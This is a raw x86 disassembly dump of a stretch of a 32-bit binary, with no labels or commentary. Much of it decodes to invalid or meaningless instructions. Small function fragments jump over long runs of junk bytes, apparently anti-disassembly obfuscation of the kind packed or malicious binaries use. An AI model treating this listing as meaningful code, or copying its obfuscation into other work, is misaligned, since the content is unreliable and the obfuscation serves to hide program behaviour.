  40516c:	mov    ds:0x985ddfff,eax
  405171:	mov    ebp,0xb529a47a
  405176:	xor    BYTE PTR ds:0xa861065a,dl
  40517c:	sbb    dh,BYTE PTR [eax]
  40517e:	or     DWORD PTR [eax-0x19],ecx
  405181:	imul   BYTE PTR [eax-0x34]
  405184:	pop    esi
  405185:	or     DWORD PTR [esi+0x682f3946],eax
  40518b:	push   0x3e
  40518d:	enter  0x1938,0xdb
  405191:	pop    ecx
  405192:	xchg   ecx,eax
  405193:	cmp    ah,ah
  405195:	iret   
  405196:	loop   0x405175
  405198:	push   esi
  405199:	fimul  DWORD PTR [edx]
  40519b:	(bad)  
  40519c:	(bad)  
  40519d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40519f:	sub    eax,0x7d396e98
  4051a4:	xor    esi,esp
  4051a6:	dec    ecx
  4051a7:	push   0xc1ccea7d
  4051ac:	jle    0x40514f
  4051ae:	and    al,0x0
  4051b0:	arpl   di,bp
  4051b2:	rcl    DWORD PTR [ebx],cl
  4051b4:	push   ecx
  4051b5:	inc    edx
  4051b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b7:	fdiv   QWORD PTR [esi+0xf]
  4051ba:	xor    eax,0xdf33e4a
  4051bf:	xchg   ebp,eax
  4051c0:	hlt    
  4051c1:	mov    edi,0x18697954
  4051c6:	inc    esp
  4051c7:	leave  
  4051c8:	xchg   edi,eax
  4051c9:	dec    edi
  4051ca:	shr    DWORD PTR [edi-0x2b],1
  4051cd:	cdq    
  4051ce:	xchg   ebx,eax
  4051cf:	jbe    0x405239
  4051d1:	ret    0x6000
  4051d4:	mov    dh,0xbf
  4051d6:	ss jmp 0x1240:0x121da778
  4051de:	ror    DWORD PTR [ebp+0x45c144fe],cl
  4051e4:	loop   0x4051d3
  4051e6:	out    dx,eax
  4051e7:	shl    BYTE PTR [ecx],0x9e
  4051ea:	scas   eax,DWORD PTR es:[edi]
  4051eb:	mov    esp,0xfd9f5b8b
  4051f0:	dec    ebp
  4051f1:	(bad)  
  4051f2:	cmp    BYTE PTR [edx-0x5776ddab],al
  4051f8:	pop    edi
  4051f9:	in     eax,dx
  4051fa:	int    0xe5
  4051fc:	mov    al,BYTE PTR [edx]
  4051fe:	aam    0xca
  405200:	jbe    0x40518c
  405202:	or     eax,0x1e9e74c0
  405207:	jno    0x405242
  405209:	mov    ecx,0xcf46a0b9
  40520f:	(bad)  
  405210:	fisubr WORD PTR [ebp+0x20933d4]
  405216:	lea    ecx,[edi+0x7a386bf7]
  40521c:	lea    esi,[esi]
  40521e:	push   es
  40521f:	inc    edx
  405220:	fwait
  405221:	inc    edx
  405222:	lds    ebx,FWORD PTR [esi-0x45]
  405225:	add    al,0x9c
  405227:	ret    0xfb40
  40522a:	mov    edx,0xfcb1d5bf
  40522f:	dec    ebp
  405230:	jp     0x4051e8
  405232:	mov    al,ds:0xaed8a7a3
  405237:	iret   
  405238:	jecxz  0x40529b
  40523a:	sbb    eax,0x850ddd47
  40523f:	sub    al,0x5b
  405241:	stos   DWORD PTR es:[edi],eax
  405242:	adc    BYTE PTR [ebp+0x21],cl
  405245:	mov    esi,0x6b510bd2
  40524a:	jge    0x405291
  40524c:	mov    dl,0xca
  40524e:	std    
  40524f:	int    0xac
  405251:	scas   eax,DWORD PTR es:[edi]
  405252:	mov    ebp,0xcc5fd68f
  405257:	lods   al,BYTE PTR ds:[esi]
  405258:	mov    edi,0xa4a1804e
  40525d:	add    al,0x46
  40525f:	add    bh,bh
  405261:	rol    BYTE PTR [eax],1
  405263:	or     ah,BYTE PTR ds:0x1b7dcfa1
  405269:	push   0xa6227642
  40526e:	inc    edi
  40526f:	fwait
  405270:	ror    bh,1
  405272:	push   ecx
  405273:	add    WORD PTR [eax+0x29247d0a],si
  40527a:	out    0x2,al
  40527c:	pop    eax
  40527d:	dec    edx
  40527e:	stos   DWORD PTR es:[edi],eax
  40527f:	pusha  
  405280:	rol    BYTE PTR [esi-0x3a],1
  405283:	clc    
  405284:	sub    dl,BYTE PTR [edi]
  405286:	mov    edi,?
  405288:	push   edx
  405289:	iret   
  40528a:	mov    eax,ds:0xf6605e81
  40528f:	pushf  
  405290:	lock outs dx,BYTE PTR ds:[esi]
  405292:	call   0xf566de02
  405297:	dec    ebp
  405298:	mov    DWORD PTR [ecx+0x621f4650],esi
  40529e:	pushf  
  40529f:	xchg   bl,bl
  4052a1:	hlt    
  4052a2:	fwait
  4052a3:	lds    eax,FWORD PTR [edi-0x3d]
  4052a6:	in     al,0xb5
  4052a8:	sub    ebp,DWORD PTR [esi+0xbb0383]
  4052ae:	dec    esi
  4052af:	dec    esp
  4052b0:	mov    al,ds:0xfd9aaf3f
  4052b5:	cmp    BYTE PTR [ebx],bl
  4052b7:	stc    
  4052b8:	xchg   esp,eax
  4052b9:	dec    edi
  4052ba:	mov    cl,0xf4
  4052bc:	ret    0x7a5
  4052bf:	ficom  DWORD PTR cs:[ecx+0x20ad81e4]
  4052c6:	cld    
  4052c7:	or     al,0x3
  4052c9:	jo     0x405280
  4052cb:	ror    BYTE PTR es:[edi],1
  4052ce:	sbb    esi,DWORD PTR [esi+0x33]
  4052d1:	repnz add eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax+0x7de20108]
  405306:	sbb    eax,0x702ac646
  40530b:	jo     0x4052e6
  40530d:	jle    0x40537f
  40530f:	jo     0x4052f4
  405311:	and    al,0x13
  405313:	mov    bh,BYTE PTR [ecx+0x59eaa028]
  405319:	sbb    BYTE PTR [edi],al
  40531b:	push   es
  40531c:	cmp    eax,DWORD PTR [edx+0x12978e97]
  405322:	mov    DWORD PTR [esi+0x64],ebp
  405325:	pop    esi
  405326:	xor    ebx,DWORD PTR [ebx+0x2edf6b83]
  40532c:	sar    ch,0xff
  40532f:	imul   ecx,edi,0xffffffad
  405332:	ret    0xc176
  405335:	ret    
  405336:	xchg   ecx,eax
  405337:	sbb    al,0xf9
  405339:	fbstp  TBYTE PTR [ebp+0x4]
  40533c:	xchg   DWORD PTR [ebp-0x73],eax
  40533f:	pop    eax
  405340:	pop    ds
  405341:	popa   
  405342:	mov    ds:0xc09c7955,eax
  405347:	xor    al,BYTE PTR [eax-0x79b27d57]
  40534d:	sbb    edi,DWORD PTR ds:0x88b36ec8
  405353:	stc    
  405354:	pop    edi
  405355:	jns    0x4052f7
  405357:	sub    edx,ebx
  405359:	ret    0x31e9
  40535c:	mov    edx,0x3134390a
  405361:	mov    edx,DWORD PTR [edx+eax*4-0x5f6248f1]
  405368:	lds    ebx,FWORD PTR [eax-0x46858cde]
  40536e:	(bad)  
  40536f:	test   eax,0x6edd3ed
  405374:	int3   
  405375:	outs   dx,BYTE PTR ds:[esi]
  405376:	push   es
  405377:	test   al,0xee
  405379:	ins    DWORD PTR es:[edi],dx
  40537a:	rol    BYTE PTR [edx-0x74],cl
  40537d:	imul   edx,DWORD PTR [edx],0xd71e3206
  405383:	adc    ch,bl
  405385:	sbb    BYTE PTR [ebp-0x49],ch
  405388:	mov    ebx,0x52061d89
  40538d:	jno    0x40532f
  40538f:	and    BYTE PTR [ecx-0x5],0xa6
  405393:	mov    WORD PTR ds:0x4c1bbd92,es
  405399:	jmp    0x6ed6:0xb3669aaa
  4053a0:	into   
  4053a1:	push   ss
  4053a2:	cs xchg esp,eax
  4053a4:	sub    DWORD PTR [ebp+0x48],edx
  4053a7:	jp     0x405411
  4053a9:	and    edi,DWORD PTR [edi-0x40]
  4053ac:	jae    0x405345
  4053ae:	mov    eax,ds:0xe214f7aa
  4053b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053b5:	fcom   DWORD PTR [esi+ebx*1+0x2d10162]
  4053bc:	sbb    DWORD PTR [eax],esp
  4053be:	adc    bl,0x24
  4053c1:	repz (bad) 
  4053c3:	jl     0x40541f
  4053c5:	lea    esp,[esi-0x47]
  4053c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053c9:	std    
  4053ca:	dec    edi
  4053cb:	mov    edi,0xb3ddb44b
  4053d0:	rcl    DWORD PTR [esi-0x2b],cl
  4053d3:	mov    BYTE PTR [eax],cl
  4053d5:	dec    ebp
  4053d6:	(bad)  
  4053d7:	aas    
  4053d8:	jb     0x40537d
  4053da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053db:	jl     0x4053e8
  4053dd:	out    dx,al
  4053de:	retf   
  4053df:	pop    ecx
  4053e0:	cld    
  4053e1:	ss mov ebx,0x5497b8b2
  4053e7:	mov    eax,ds:0xaf58e8e2
  4053ec:	sub    edx,DWORD PTR [esp+esi*1-0x1fe05ed3]
  4053f3:	scas   eax,DWORD PTR es:[edi]
  4053f4:	out    dx,al
  4053f5:	out    dx,eax
  4053f6:	add    al,0x79
  4053f8:	jge    0x40546a
  4053fa:	mov    eax,ds:0xdf2298d7
  4053ff:	(bad)  
  405402:	push   ds
  405403:	idiv   BYTE PTR ds:0xd6fb3c73
  405409:	inc    ebx
  40540a:	lahf   
  40540b:	push   0x476de086
  405410:	aad    0x4e
  405412:	xchg   DWORD PTR [esp+ebx*2-0x522d9f16],ecx
  405419:	scas   eax,DWORD PTR es:[edi]
  40541a:	mov    dl,0x18
  40541c:	and    BYTE PTR [edi-0x6a87fff7],dh
  405422:	pop    ds
  405423:	imul   ebp,DWORD PTR [ebx],0x330b4a64
  405429:	pop    ebp
  40542a:	dec    ecx
  40542b:	adc    al,0xa
  40542d:	stos   DWORD PTR es:[edi],eax
  40542e:	jmp    0x40546b
  405430:	mov    eax,ds:0x966b9095
  405435:	repz dec ecx
  405437:	test   BYTE PTR [edx],dl
  405439:	les    esi,FWORD PTR [edx+edx*2+0x22cad137]
  405440:	or     bh,cl
  405442:	into   
  405443:	mov    WORD PTR [edi+0x684dc5f7],fs
  405449:	and    ebp,DWORD PTR [esi]
  40544b:	xor    eax,0xe6c2d550
  405450:	repz fwait
  405452:	jge    0x40544d
  405454:	or     al,0xcd
  405456:	sub    DWORD PTR [ebx+edx*2-0x8e8e5e3],ebx
  40545d:	js     0x4054cc
  40545f:	xchg   edi,eax
  405460:	xchg   ebx,eax
  405461:	inc    ebp
  405462:	dec    ecx
  405463:	or     eax,0x50535aff
  405468:	jo     0x4054c7
  40546a:	(bad)  
  40546b:	push   0x59
  40546d:	pop    ebx
  40546e:	dec    esp
  40546f:	mov    ebx,0xbd8ac9b4
  405474:	mov    ds:0xf47e2a27,eax
  405479:	imul   esp,DWORD PTR [ebx+0x58],0xed334f3
  405480:	ds push edi
  405482:	iret   
  405483:	jl     0x405455
  405485:	adc    DWORD PTR [esi],esi
  405487:	fs int 0x3
  40548a:	or     ch,bl
  40548c:	xor    al,0x29
  40548e:	call   0x64a99728
  405493:	loop   0x40546e
  405495:	shl    BYTE PTR [esi],1
  405497:	mov    esi,0x56091fb8
  40549c:	mov    ebp,0xd4895fbf
  4054a1:	gs pop esi
  4054a3:	out    0xaa,al
  4054a5:	push   esp
  4054a6:	dec    ecx
  4054a7:	lahf   
  4054a8:	mov    dl,0x92
  4054aa:	fldenv [edx+0x3487d115]
  4054b0:	rcl    BYTE PTR [edx-0x5e],1
  4054b3:	(bad)  
  4054b4:	sub    al,0xbe
  4054b6:	cmp    BYTE PTR [edi],dl
  4054b8:	repz push esp
  4054ba:	mov    eax,0x3524d70b
  4054bf:	popf   
  4054c0:	retf   
  4054c1:	or     ch,BYTE PTR [ebx-0x42abe7b0]
  4054c7:	xchg   esp,eax
  4054c8:	add    eax,eax
  4054ca:	pcmpgtb mm5,QWORD PTR [ebx]
  4054cd:	push   ss
  4054ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054cf:	add    esp,DWORD PTR [ebx+esi*4]
  4054d2:	xor    esi,esi
  4054d4:	inc    ebx
  4054d5:	gs das 
  4054d7:	xchg   esp,eax
  4054d8:	fcom   QWORD PTR [edx+0x53]
  4054db:	cmc    
  4054dc:	inc    ebp
  4054dd:	xor    ebp,esi
  4054df:	add    DWORD PTR [ebx+0x5e],edi
  4054e2:	cmp    eax,0xd24be55
  4054e7:	cld    
  4054e8:	push   ds
  4054e9:	sbb    ebx,ebx
  4054eb:	push   edi
  4054ec:	jbe    0x40547d
  4054ee:	jl     0x40552d
  4054f0:	(bad)  
  4054f1:	xor    BYTE PTR [edi-0x15a03b5],bh
  4054f7:	fist   WORD PTR [ecx+0x7f586cf7]
  4054fd:	sbb    dl,cl
  4054ff:	dec    ebx
  405500:	scas   eax,DWORD PTR es:[edi]
  405501:	adc    al,BYTE PTR [esi-0x25]
  405504:	fdivr  DWORD PTR ss:[edi+0x1b2e2552]
  40550b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40550c:	in     al,0xa
  40550e:	mov    ecx,0xf789b1fe
  405513:	cmp    dl,dh
  405515:	pop    ebx
  405516:	fdivr  DWORD PTR [ecx-0x567f0c7b]
  40551c:	hlt    
  40551d:	mov    eax,ds:0xa7a95895
  405522:	rcr    BYTE PTR [edi],1
  405524:	cmp    dh,al
  405526:	lods   eax,DWORD PTR ds:[esi]
  405527:	add    BYTE PTR [ebp+0x14a64131],0x7a
  40552e:	cmp    al,0x46
  405530:	mov    ds:0xbc1275cf,eax
  405535:	out    dx,eax
  405536:	cmp    al,0x4e
  405538:	jns    0x4054d2
  40553a:	jmp    0x4055b7
  40553c:	or     BYTE PTR [esp+ebx*1-0x4636bc39],cl
  405543:	push   cs
  405544:	cli    
  405545:	loop   0x4054f8
  405547:	mov    cl,0x24
  405549:	sti    
  40554a:	sahf   
  40554b:	fnsave [esi+ebp*4-0x2b05569b]
  405552:	or     ch,BYTE PTR ds:0xd464b85
  405558:	gs pop ss
  40555a:	mov    esi,0xcc3f68a4
  40555f:	or     esi,ecx
  405561:	not    BYTE PTR [edx]
  405563:	mov    eax,0x536b7838
  405568:	nop
  405569:	sbb    ch,ch
  40556b:	out    0x8d,al
  40556d:	pop    ds
  40556e:	sbb    BYTE PTR [ecx+0x27],dl
  405571:	jl     0x405576
  405573:	or     ah,dh
  405575:	mov    al,BYTE PTR [edx]
  405577:	add    esi,ecx
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x4344a1,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x43277c,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x4344b9
  4055da:	mov    edx,DWORD PTR ds:0x4344dd
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xfbf0cf84
  405600:	jns    0x4055b1
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x40563a
  40560a:	stos   BYTE PTR es:[edi],al
  40560b:	out    0xe9,al
  40560d:	lock dec ebp
  40560f:	leave  
  405610:	jl     0x40565d
  405612:	mov    dh,0xbe
  405614:	sub    dh,BYTE PTR [edx-0x43]
  405617:	lea    edi,[edx+ebp*8]
  40561a:	test   eax,0xf96ddf5
  40561f:	add    BYTE PTR [ebx+0x1236d4f1],ah
  405625:	pop    eax
  405626:	inc    ebx
  405627:	into   
  405628:	xchg   esi,eax
  405629:	repz or edi,ebp
  40562c:	sub    BYTE PTR [ebp+0x63],dh
  40562f:	fwait
  405630:	sbb    ebp,DWORD PTR [ecx]
  405632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405633:	adc    ebx,DWORD PTR [ebx]
  405635:	sub    eax,0x6bca3a1
  40563a:	lods   eax,DWORD PTR ds:[esi]
  40563b:	imul   ebx,edx,0x39
  40563e:	sbb    eax,0xc4849fa9
  405643:	xlat   BYTE PTR ds:[ebx]
  405644:	jnp    0x40561c
  405646:	cmp    BYTE PTR [ebx+0x75bfd9ca],bl
  40564c:	and    DWORD PTR [eax],0x867255d3
  405652:	cmp    eax,0xf570b4c4
  405657:	pop    esi
  405658:	fdiv   QWORD PTR [edi-0x6ab01547]
  40565e:	sti    
  40565f:	fisub  WORD PTR [ebx+0x4c]
  405662:	cmp    dl,BYTE PTR [ebp-0x732a61ec]
  405668:	sbb    eax,0x94976fc5
  40566d:	in     al,dx
  40566e:	data16 icebp 
  405670:	adc    cl,0x4c
  405673:	ins    BYTE PTR es:[edi],dx
  405674:	xchg   esp,eax
  405675:	mov    esi,0xf767b439
  40567a:	dec    ebp
  40567b:	sbb    cl,BYTE PTR [ebp+0x7eb8550b]
  405681:	inc    ecx
  405682:	shl    BYTE PTR [esi-0x6e28342c],cl
  405688:	pop    es
  405689:	addr16 hlt 
  40568b:	jbe    0x40567f
  40568d:	pop    esp
  40568e:	sub    cl,bl
  405690:	call   0x1763:0x91d1789a
  405697:	mov    ds:0x64572c6a,eax
  40569c:	(bad)  
  40569d:	jae    0x40569f
  40569f:	push   ebx
  4056a0:	ins    BYTE PTR es:[edi],dx
  4056a1:	rcl    dh,cl
  4056a3:	div    BYTE PTR [edi+0x2563ccc0]
  4056a9:	cwde   
  4056aa:	jl     0x405705
  4056ac:	cmp    ebx,DWORD PTR [ebp-0x2be38382]
  4056b2:	jl     0x405661
  4056b4:	aas    
  4056b5:	fild   DWORD PTR [esi-0x1a8923b4]
  4056bb:	adc    cl,BYTE PTR [edx+0x23043fca]
  4056c1:	xor    al,0xc5
  4056c3:	rcr    DWORD PTR [esi],cl
  4056c5:	lock pop esi
  4056c7:	pop    ds
  4056c8:	fcmovne st,st(4)
  4056ca:	(bad)  
  4056cc:	push   edi
  4056cd:	call   0x9111:0x9c0359b2
  4056d4:	idiv   BYTE PTR [esi+ecx*2+0x552d26]
  4056db:	iret   
  4056dc:	mov    ?,ecx
  4056de:	adc    al,0xb2
  4056e0:	jle    0x405722
  4056e2:	(bad)  
  4056e3:	or     eax,esi
  4056e5:	or     eax,0x33201edf
  4056ea:	dec    ecx
  4056eb:	(bad)  
  4056ec:	and    esi,DWORD PTR [ecx+0x4d495524]
  4056f2:	push   esp
  4056f3:	adc    al,BYTE PTR [esp+eax*4-0x7192f781]
  4056fa:	push   esp
  4056fb:	int3   
  4056fc:	push   ebp
  4056fd:	sub    cl,BYTE PTR [eax-0x61081a7c]
  405703:	das    
  405704:	lock jb 0x4056c4
  405707:	cdq    
  405708:	addr16 pop esi
  40570a:	sahf   
  40570b:	test   DWORD PTR [edx],ecx
  40570d:	mov    esp,0x85452c11
  405712:	cmp    dl,bh
  405714:	loopne 0x4056f7
  405716:	lea    ecx,es:[edi-0x39]
  40571a:	add    al,0x21
  40571c:	mov    al,ds:0xbf112cc9
  405721:	pop    edi
  405722:	mov    gs,WORD PTR [ebp+ecx*8-0x48]
  405726:	fadd   QWORD PTR [ebx+0x4e]
  405729:	add    eax,0x478acab9
  40572e:	cmp    dl,BYTE PTR [esi+eax*2]
  405731:	inc    edx
  405732:	push   edx
  405733:	add    esp,DWORD PTR [edx+edx*2]
  405736:	cmp    edx,esp
  405738:	arpl   si,si
  40573a:	fdivp  st(0),st
  40573c:	out    0x40,eax
  40573e:	adc    ebx,DWORD PTR [esi+0x1e]
  405741:	push   ss
  405742:	popa   
  405743:	js     0x40570e
  405745:	dec    eax
  405746:	inc    edi
  405747:	add    bh,al
  405749:	adc    al,0x24
  40574b:	inc    ebp
  40574c:	mov    ?,esi
  40574e:	pop    esp
  40574f:	mov    WORD PTR [ecx+0x3f],gs
  405752:	or     BYTE PTR [ebx+0x41],bh
  405755:	push   esi
  405756:	mov    esi,DWORD PTR [ebp+0x10]
  405759:	and    DWORD PTR ds:0x4343ea,0x0
  405763:	mov    edx,DWORD PTR ds:0x4343ea
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x4343ea,edx
  405770:	cmp    DWORD PTR ds:0x4343ea,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x432a42
  405789:	cmp    DWORD PTR ds:0x4343ea,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432e3e,0x43440a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x432774
  4057b1:	and    eax,DWORD PTR ds:0x43441a
  4057b7:	mov    ds:0x432774,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x4343fe,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432784,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x8b519e0f
  4057ff:	(bad)  [ecx+0x703773b7]
  405805:	jo     0x4057cb
  405807:	jg     0x405879
  405809:	jo     0x40586e
  40580b:	jae    0x40583c
  40580d:	mov    eax,DWORD PTR [edx+0x68]
  405810:	mov    cl,0x3
  405812:	mov    DWORD PTR ds:0x33c83bf5,ebp
  405818:	aam    0x4b
  40581a:	mov    esi,0x491fef5a
  40581f:	out    dx,eax
  405820:	mov    bl,0x30
  405822:	stos   DWORD PTR es:[edi],eax
  405823:	xchg   ebx,ecx
  405825:	jns    0x405853
  405827:	fsubr  DWORD PTR [edi-0x43]
  40582a:	and    ebx,DWORD PTR [ecx+ecx*4+0x1d86a700]
  405831:	mov    DWORD PTR [ebx+0x7c],edi
  405834:	cmp    eax,0xacaf5442
  405839:	sbb    ebx,DWORD PTR [eax-0x38]
  40583c:	in     eax,0x48
  40583e:	call   0x56437fc6
  405843:	adc    eax,ecx
  405845:	inc    esp
  405846:	adc    al,0x8a
  405848:	mov    esi,0xe9807311
  40584d:	or     eax,0xa3651ba8
  405852:	xchg   edi,eax
  405853:	or     ebp,DWORD PTR [edx-0x4c]
  405856:	test   BYTE PTR [edi],bh
  405858:	inc    ebx
  405859:	fwait
  40585a:	imul   ecx,DWORD PTR [esi],0xffffffef
  40585d:	cld    
  40585e:	popa   
  40585f:	fcomi  st,st(6)
  405861:	cmp    dl,ch
  405863:	(bad)  
  405864:	icebp  
  405865:	fiadd  DWORD PTR [ecx-0x15]
  405868:	dec    esp
  405869:	xor    ah,BYTE PTR [ebx+0x263670c6]
  40586f:	or     ah,0x62
  405872:	pop    esp
  405873:	int3   
  405874:	dec    ecx
  405875:	in     al,dx
  405876:	pop    esp
  405877:	add    al,0xd8
  405879:	ss popa 
  40587b:	sbb    al,0xa1
  40587d:	ins    BYTE PTR es:[edi],dx
  40587e:	jg     0x4058ce
  405880:	loop   0x405869
  405882:	sbb    eax,0xca2eb7ac
  405887:	fidivr WORD PTR [edi+esi*8-0x2d]
  40588b:	pop    ss
  40588c:	rcr    dh,0x7b
  40588f:	mov    ch,ah
  405891:	test   BYTE PTR [edx+eax*8],bh
  405894:	or     bh,0x2a
  405897:	es ins DWORD PTR es:[edi],dx
  405899:	mov    al,0xe7
  40589b:	jl     0x40584c
  40589d:	xchg   ebx,eax
  40589e:	shl    esi,0xaa
  4058a1:	adc    BYTE PTR [ebx-0x32e774f3],ah
  4058a7:	xchg   ebx,eax
  4058a8:	inc    ebp
  4058a9:	jp     0x40587a
  4058ab:	icebp  
  4058ac:	stos   DWORD PTR es:[edi],eax
  4058ad:	mov    al,ds:0x88db1aa
  4058b2:	sbb    DWORD PTR [edi+0x6a36510b],edi
  4058b8:	mov    ch,BYTE PTR [edi-0xa]
  4058bb:	jb     0x40592a
  4058bd:	jge    0x405876
  4058bf:	iret   
  4058c0:	mov    esp,0x229d9fe0
  4058c5:	xchg   edi,eax
  4058c6:	jb     0x40593c
  4058c8:	outs   dx,BYTE PTR ds:[esi]
  4058c9:	xchg   edi,eax
  4058ca:	dec    BYTE PTR [ebx-0x5dd8526a]
  4058d0:	inc    edi
  4058d1:	scas   eax,DWORD PTR es:[edi]
  4058d2:	fsub   DWORD PTR [edi+0x2d]
  4058d5:	dec    edi
  4058d6:	and    cl,BYTE PTR [eax+0x73]
  4058d9:	push   ds
  4058da:	sbb    eax,0x69f7566
  4058df:	pop    eax
  4058e0:	aas    
  4058e1:	rol    DWORD PTR es:[esi+0x2efe1b2],1
  4058e8:	push   esp
  4058e9:	ret    
  4058ea:	out    dx,al
  4058eb:	dec    eax
  4058ec:	outs   dx,BYTE PTR ds:[esi]
  4058ed:	jmp    0xefd6422c
  4058f2:	cmp    BYTE PTR [ecx+0x11],ch
  4058f5:	icebp  
  4058f6:	inc    ebx
  4058f7:	ret    
  4058f8:	sbb    DWORD PTR [edi],0xffffffe6
  4058fb:	loop   0x40588d
  4058fd:	clc    
  4058fe:	mov    al,0x55
  405900:	pop    ebp
  405901:	push   eax
  405902:	inc    edx
  405903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405904:	sbb    BYTE PTR [ecx+0x43],ah
  405907:	es adc BYTE PTR gs:[edx+0x49f34015],bl
  40590f:	ins    BYTE PTR es:[edi],dx
  405910:	mov    dh,0x47
  405912:	jns    0x40595f
  405914:	adc    eax,0x6efd1d40
  405919:	xor    BYTE PTR [esi+0x4b1b8361],al
  40591f:	out    dx,eax
  405920:	fisttp QWORD PTR [ebx-0x21]
  405923:	mov    bl,0xf2
  405925:	jne    0x4059a4
  405927:	iret   
  405928:	sar    DWORD PTR ds:0x17cb3910,1
  40592e:	lods   al,BYTE PTR ds:[esi]
  40592f:	jbe    0x4058c9
  405931:	sub    dh,al
  405933:	std    
  405934:	inc    edx
  405935:	(bad)  
  405936:	mov    esp,esi
  405938:	push   esp
  405939:	sbb    DWORD PTR [edx-0x71],0x3c3339f1
  405940:	jbe    0x40590a
  405942:	ins    BYTE PTR es:[edi],dx
  405943:	pop    ds
  405944:	leave  
  405945:	sub    eax,0x7d2ed951
  40594a:	(bad)  
  40594b:	adc    esp,DWORD PTR [ecx-0x2bac2639]
  405951:	nop
  405952:	lods   eax,DWORD PTR ds:[esi]
  405953:	out    0x25,eax
  405955:	ror    BYTE PTR [ebx-0x3eccf7bb],0x3
  40595c:	ret    0xc95e
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x7c9b6211
  40597e:	jge    0x405947
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	inc    ecx
  405988:	jb     0x405949
  40598a:	lds    eax,FWORD PTR [ebx-0x169210e4]
  405990:	fadd   st(2),st
  405992:	(bad)  
  405993:	cmc    
  405994:	mov    ah,0x38
  405996:	xchg   esi,eax
  405997:	cs aas 
  405999:	and    DWORD PTR [esi],ebp
  40599b:	mov    dh,0x4b
  40599d:	jecxz  0x4059a5
  40599f:	fdivr  DWORD PTR [ebx+eiz*4]
  4059a2:	ds dec edi
  4059a4:	fdivr  QWORD PTR [esi+ebx*4+0x5a5b9c19]
  4059ab:	fidivr WORD PTR [edx-0x68925ae1]
